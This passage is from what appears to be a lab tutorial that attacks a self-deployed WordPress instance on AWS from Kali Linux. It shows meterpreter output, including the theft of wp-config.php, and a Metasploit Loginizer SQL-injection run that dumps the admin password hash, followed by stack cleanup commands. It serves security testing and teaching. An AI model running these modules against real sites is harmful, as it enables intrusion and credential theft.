 1    /bin/sh                                           1001  /bin/sh -c /opt/copilot/scripts/startup.sh
 8    /bin/sh                                           1001  /bin/sh /opt/copilot/scripts/startup.sh
 15   /managed-agents/execute-command/amazon-ssm-agent  root  /managed-agents/execute-command/amazon-ssm-agent
 30   /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 60   /managed-agents/execute-command/ssm-agent-worker  root  /managed-agents/execute-command/ssm-agent-worker
 345  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 346  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 347  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 348  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 349  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 350  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 352  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 406  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 407  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 408  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 419  sh                                                1001  sh -c ps ax -w -o pid,user,cmd --no-header 2>/dev/null
 420  ps                                                1001  ps ax -w -o pid,user,cmd --no-header

[*] Running 'sysinfo' on meterpreter session 1 (18.158.31.183)
Computer    : ip-10-0-0-38.eu-central-1.compute.internal
OS          : Linux ip-10-0-0-38.eu-central-1.compute.internal 5.10.215-203.850.amzn2.x86_64 #1 SMP Tue Apr 23 20:32:19 UTC 2024 x86_64
Meterpreter : php/linux
[*] Running 'download /bitnami/wordpress/wp-config.php' on meterpreter session 1 (18.158.31.183)
[*] Downloading: /bitnami/wordpress/wp-config.php -> /home/kali/wp-config.php
[*] Downloaded 4.28 KiB of 4.28 KiB (100.0%): /bitnami/wordpress/wp-config.php -> /home/kali/wp-config.php
[*] Completed  : /bitnami/wordpress/wp-config.php -> /home/kali/wp-config.php

resource (stdin)> use auxiliary/scanner/http/wp_loginizer_log_sqli

resource (stdin)> set rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
rhost => http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com

resource (stdin)> set verbose true
verbose => true

resource (stdin)> run
[*] Checking /wp-content/plugins/loginizer/readme.txt
[*] Found version 1.6.3 in the plugin
[+] Vulnerable version of Loginizer detected
[*] {SQLi} Executing (select group_concat(JC) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) JC from wp_users limit 1) JIVez)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 wordpress   $P$B8OjOUCRrPXm/TrVQ2/WJqUp5w7WmI.

[*] Scanned 1 of 2 hosts (50% complete)
[*] Checking /wp-content/plugins/loginizer/readme.txt
[*] Found version 1.6.3 in the plugin
[+] Vulnerable version of Loginizer detected
[*] Scanned 1 of 2 hosts (50% complete)
[*] {SQLi} Executing (select group_concat(TXChHXg) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) TXChHXg from wp_users limit 1) fA)
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 1 of 2 hosts (50% complete)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 wordpress   $P$B8OjOUCRrPXm/TrVQ2/WJqUp5w7WmI.

[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed

resource (stdin)> exit -y
```

From the outputs above, you can see the attack against WordPress was
successful. We obtained details about the remote system, such as a list of
processes, the `wp-config.php` file, system details, and a list of users with
their password hashes.

## Cleanup

Delete the Amazon EKS cluster, EC2 instances, VPCs, EC2 Key Pair, DB snapshots,
SSM parameters, and CloudWatch Log Groups:

```sh
export AWS_REGION="eu-central-1"
export AWS_EC2_KEY_PAIR_NAME="wordpress-test"
export SOLUTION_KALI="KaliLinux-NICE-DCV"
export SOLUTION_EC2_CONTAINER="Amazon-EC2-Container"
export SOLUTION_EC2="Amazon-EC2"

aws cloudformation delete-stack --stack-name "${SOLUTION_KALI}"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2_CONTAINER}"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2}"
aws cloudformation delete-stack --stack-name "${SOLUTION_KALI}-VPC"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2_CONTAINER}-VPC"
aws cloudformation delete-stack --stack-name "${SOLUTION_EC2}-VPC"
aws ec2 delete-key-pair --key-name "${AWS_EC2_KEY_PAIR_NAME}"
for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,UbuntuLinux-2204-LAMP-server.yaml,AmazonLinux-2023-LAMP-server.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,wordpress_plugin_install.sh,Dockerfile,startup.sh}; do
  if [[ -f "${FILE}" ]]; then
    rm -v "${FILE}"
  else
    echo "*** File not found: ${FILE}"
  fi
done
if copilot app ls | grep wordpress; then
  copilot app delete --name wordpress --yes
  if [[ -d "${TMP_DIR}/copilot" ]]; then
    rm -rf "${TMP_DIR}/copilot"
  fi
fi
if aws ssm get-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME; then
  aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
fi
if aws ssm get-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD; then
  aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
fi
aws logs describe-log-groups --log-group-name-prefix /aws/lambda/wordpress-dev-wordpress --query 'logGroups[*].logGroupName' | jq -r '.[]' | xargs -I {} aws logs delete-log-group --log-group-name {}
aws rds describe-db-cluster-snapshots --query "DBClusterSnapshots[?starts_with(DBClusterSnapshotIdentifier, \`wordpress-dev-wordpress\`) == \`true\`].DBClusterSnapshotIdentifier" | jq -r '.[]' | xargs -I {} aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier {}
```

Enjoy ... ðŸ˜‰
